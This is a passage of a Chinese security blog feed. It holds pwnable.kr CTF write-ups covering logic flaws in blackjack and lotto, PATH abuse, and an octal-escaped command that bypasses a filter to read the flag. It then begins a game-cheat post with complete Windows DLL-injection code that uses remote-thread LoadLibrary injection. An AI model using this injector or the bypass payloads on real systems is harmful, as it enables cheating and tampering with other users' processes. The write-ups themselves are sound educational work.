class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nUnbelievable! You Win!\n&quot;</span>);<br>         won = won+<span class="hljs-number">1</span>;<br>         cash = cash+bet;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);<br>         dealer_total=<span class="hljs-number">0</span>;<br>         askover();<br>      &#125;<br>     &#125;<br>     <span class="hljs-keyword">else</span><br>     &#123;<br>         stay();<br>     &#125;<br>     <br>&#125; <span class="hljs-comment">// End Function</span><br></code></pre></td></tr></table></figure><p>因此直接输入 一个超大的负数即可获得flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">Enter Bet: -1000000<br><br><br>Would You Like to Hit or Stay?<br>Please Enter H to Hit or S to Stay.<br>S<br><br>You Have Chosen to Stay at 10. Wise Decision!<br><br>The Dealer Has a Total of 20<br>Dealer Has the Better Hand. You Lose.<br><br>You have 4 Wins and 6 Losses. Awesome!<br><br>Would You Like To Play Again?<br>Please Enter Y <span class="hljs-keyword">for</span> Yes or N <span class="hljs-keyword">for</span> No<br>y<br>YaY_I_AM_A_MILLIONARE_LOL<br><br><br>Cash: <span class="hljs-variable">$1010500</span><br>-------<br>|C    |<br>|  8  |<br>|    C|<br>-------<br><br>Your Total is 8<br><br>The Dealer Has a Total of 3<br><br>Enter Bet: $<br><br></code></pre></td></tr></table></figure><p>以上解法可能是非预期解，还有一种解法是betting()函数中没有对bet的值进行二次校验，可以连续两次输入大于500的数，因为第二次输入就没有比较的过程了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">betting</span><span class="hljs-params">()</span> <span class="hljs-comment">//Asks user amount to bet</span><br>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\nEnter Bet: $&quot;</span>);<br> <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;bet);<br><br> <span class="hljs-keyword">if</span> (bet &gt; cash) <span class="hljs-comment">//If player tries to bet more money than player has</span><br> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nYou cannot bet more money than you have.&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter Bet: &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;bet);<br>        <span class="hljs-keyword">return</span> bet;<br> &#125;<br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> bet;<br>&#125; <span class="hljs-comment">// End Function</span><br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">YaY_I_AM_<span class="hljs-built_in">A_MILLIONARE</span>_LOL<br></code></pre></td></tr></table></figure><h2 id="Pwnable-kr-lotto-逻辑漏洞"><a href="#Pwnable-kr-lotto-逻辑漏洞" class="headerlink" title="Pwnable.kr-lotto-逻辑漏洞"></a>Pwnable.kr-lotto-逻辑漏洞</h2><p>本题很简单，在判断乐透数字的时候用了一个双层for循环，但是没有检查用户输入的6个数字是否一样，如果lotto数字是123456，此时用户只需输入任意一个lotto数字6次即可大大提高中奖概率：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++)&#123;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">6</span>; j++)&#123;<br><span class="hljs-keyword">if</span>(lotto[i] == submit[j])&#123;<br>match++;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">sorry mom... I FORGOT to<span class="hljs-built_in"> check </span>duplicate numbers...<span class="hljs-keyword"> :</span>(<br></code></pre></td></tr></table></figure><h2 id="Pwnable-kr-cmd1-Linux环境变量科普"><a href="#Pwnable-kr-cmd1-Linux环境变量科普" class="headerlink" title="Pwnable.kr-cmd1-Linux环境变量科普"></a>Pwnable.kr-cmd1-Linux环境变量科普</h2><p>这道题就是科普一下PATH，代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">filter</span><span class="hljs-params">(<span class="hljs-type">char</span>* cmd)</span>&#123;<br>        <span class="hljs-type">int</span> r=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;flag&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;sh&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;tmp&quot;</span>)!=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> r;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[], <span class="hljs-type">char</span>** envp)</span>&#123;<br>        putenv(<span class="hljs-string">&quot;PATH=/thankyouverymuch&quot;</span>);<br>        <span class="hljs-keyword">if</span>(filter(argv[<span class="hljs-number">1</span>])) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        system( argv[<span class="hljs-number">1</span>] );<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见不能直接<code>cat flag</code>，看环境变量，进入<code>/tmp/thankyouverymuch</code>目录，发现已经有人帮我们写好文件了hh，那就直接拿来用吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd1@prowl:/tmp/thankyouverymuch$ /home/cmd1/cmd1 ./test<br>mommy now I get what PATH environment is <span class="hljs-keyword">for</span> :)<br></code></pre></td></tr></table></figure><h2 id="Pwnable-kr-cmd2-Linux-bash"><a href="#Pwnable-kr-cmd2-Linux-bash" class="headerlink" title="Pwnable.kr-cmd2-Linux_bash"></a>Pwnable.kr-cmd2-Linux_bash</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">filter</span><span class="hljs-params">(<span class="hljs-type">char</span>* cmd)</span>&#123;<br>        <span class="hljs-type">int</span> r=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;=&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;PATH&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;export&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;/&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;`&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;flag&quot;</span>)!=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> r;<br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span>** environ;<br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_env</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">char</span>** p;<br>        <span class="hljs-keyword">for</span>(p=environ; *p; p++) <span class="hljs-built_in">memset</span>(*p, <span class="hljs-number">0</span>, <span class="hljs-built_in">strlen</span>(*p));<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[], <span class="hljs-type">char</span>** envp)</span>&#123;<br>        delete_env();<br>        putenv(<span class="hljs-string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);<br>        <span class="hljs-keyword">if</span>(filter(argv[<span class="hljs-number">1</span>])) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>        system( argv[<span class="hljs-number">1</span>] );<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这道题是上一题的升级，不能用环境变量了，此时考虑使用bash自身特性绕过过滤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd2@prowl:~$ ./cmd2 <span class="hljs-string">&#x27;$(echo &quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&quot;)&#x27;</span><br>$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&quot;</span>)<br>FuN_w1th_5h3ll_v4riabl3s_haha<br><br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Fu<span class="hljs-symbol">N_w1</span>th_<span class="hljs-number">5</span>h<span class="hljs-number">3</span>ll_v<span class="hljs-number">4</span>riabl<span class="hljs-number">3</span>s_haha<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Pwnable-kr-BlackJack-逻辑漏洞&quot;&gt;&lt;a href=&quot;#Pwnable-kr-BlackJack-逻辑漏洞&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.kr-BlackJack-逻辑漏洞&quot;&gt;&lt;/a&gt;Pwnable.kr-BlackJack-逻辑漏洞&lt;/h2&gt;&lt;p&gt;游戏代码在这里:&lt;a href=&quot;https://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html&quot;&gt;https://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;查看代码发现代码量很多，以为很复杂，但静下心看一下发现其实很简单，大部分代码用来实现游戏逻辑，获取flag的条件是成为百万富翁，就是使自己的余额大于一百万，游戏规则介绍中也说了，不要试着真去赌，因为每一把都是随机的，很可能一夜回到解放前，因此要寻找题目中的漏洞，按照经验，这种题出现漏洞可能是整数溢出或者是数据校验不严格，然后我发现题目中对用户输入赌注的地方缺乏负数校验：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs c&quot;&gt;&lt;span class=&quot;hljs-type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;hljs-title function_&quot;&gt;betting&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;hljs-comment&quot;&gt;//Asks user amount to bet&lt;/span&gt;&lt;br&gt;&amp;#123;&lt;br&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&amp;quot;\n\nEnter Bet: $&amp;quot;&lt;/span&gt;);&lt;br&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;scanf&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;bet);&lt;br&gt;&lt;br&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (bet &amp;gt; cash) &lt;span class=&quot;hljs-comment&quot;&gt;//If player tries to bet more money than player has&lt;/span&gt;&lt;br&gt; &amp;#123;&lt;br&gt;		&lt;span class=&quot;hljs-built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&amp;quot;\nYou cannot bet more money than you have.&amp;quot;&lt;/span&gt;);&lt;br&gt;		&lt;span class=&quot;hljs-built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&amp;quot;\nEnter Bet: &amp;quot;&lt;/span&gt;);&lt;br&gt;        &lt;span class=&quot;hljs-built_in&quot;&gt;scanf&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;bet);&lt;br&gt;        &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; bet;&lt;br&gt; &amp;#125;&lt;br&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; bet;&lt;br&gt;&amp;#125; &lt;span class=&quot;hljs-comment&quot;&gt;// End Function&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://www.hvnt3r.top/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://www.hvnt3r.top/tags/PWN/"/>
    
    <category term="Pwnable.kr" scheme="https://www.hvnt3r.top/tags/Pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>CS1.6DLL注入外挂</title>
    <link href="https://www.hvnt3r.top/2019/07/CS1-6DLL%E6%B3%A8%E5%85%A5%E5%A4%96%E6%8C%82/"/>
    <id>https://www.hvnt3r.top/2019/07/CS1-6DLL%E6%B3%A8%E5%85%A5%E5%A4%96%E6%8C%82/</id>
    <published>2019-07-11T15:01:47.000Z</published>
    <updated>2022-02-16T12:06:42.855Z</updated>
    
    <content type="html"><![CDATA[<p>研究外挂只是想学一下r0,r3攻防对抗，不干坏事，乖巧.jpg</p><p>这一次做一下锁血</p><p>首先常规操作获取血量地址：<br><img src="https://i.loli.net/2019/07/22/5d35d4989bfc534573.png"></p><span id="more"></span><p>进程注入相关代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllinjecter.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;atlstr.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>CString strMsg;<br>HANDLE hToken;<br><span class="hljs-keyword">if</span> (FALSE == <span class="hljs-built_in">OpenProcessToken</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), TOKEN_ALL_ACCESS, &amp;hToken)) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Open process token failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>LUID luid;<br><span class="hljs-keyword">if</span> (FALSE == <span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;luid)) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Query privilegevalue failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>TOKEN_PRIVILEGES tkp;<br>tkp.PrivilegeCount = <span class="hljs-number">1</span>;<br>tkp.Privileges[<span class="hljs-number">0</span>].Luid = luid;<br>tkp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><span class="hljs-keyword">if</span> (FALSE == <span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tkp, <span class="hljs-built_in">sizeof</span>(tkp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Adjust process privilege token failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>HWND hWindow = ::<span class="hljs-built_in">FindWindow</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Counter-Strike&quot;</span>));<br><span class="hljs-keyword">if</span> (hWindow == <span class="hljs-literal">NULL</span>) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;FindWindow failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>DWORD dwPid = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">GetWindowThreadProcessId</span>(hWindow, &amp;dwPid);<br><span class="hljs-keyword">if</span> (dwPid == <span class="hljs-number">0</span>) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;GetWindowThreadProcessId() failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>HANDLE hCSProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);<br><span class="hljs-keyword">if</span> (hCSProcess == <span class="hljs-literal">NULL</span>) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;OpenProcess() failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">char</span> dllName[] = <span class="hljs-string">&quot;CHEATINGPLUGIN.dll&quot;</span>;<br>DWORD size = <span class="hljs-built_in">strlen</span>(dllName) + <span class="hljs-number">5</span>;<br>LPVOID lpAddr = <span class="hljs-built_in">VirtualAllocEx</span>(hCSProcess, <span class="hljs-literal">NULL</span>, size, MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-keyword">if</span> (lpAddr == <span class="hljs-literal">NULL</span>) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;VirtualAllocEx() failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (FALSE == <span class="hljs-built_in">WriteProcessMemory</span>(<br>hCSProcess,<br>lpAddr,<br>dllName,<br>size,<br><span class="hljs-literal">NULL</span><br>)) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;WriteProcessMemory() failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE)::<span class="hljs-built_in">GetProcAddress</span>(::<span class="hljs-built_in">GetModuleHandle</span>(<br><span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Kernel32.dll&quot;</span>)),<br><span class="hljs-string">&quot;LoadLibraryA&quot;</span><br>);<br>HANDLE hThreadHandle = ::<span class="hljs-built_in">CreateRemoteThread</span>(hCSProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, pfnStartAddr, lpAddr, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hThreadHandle) &#123;<br>strMsg.<span class="hljs-built_in">Format</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;CreateRemoteThread() failed, error code: %d&quot;</span>), <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, strMsg, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Warning&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//MessageBox(NULL, &quot;Succeed!&quot;, &quot;Congratulations&quot;, MB_OK);</span><br>&#125;<br></code></pre></td></tr></table></figure><p>Dll文件代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 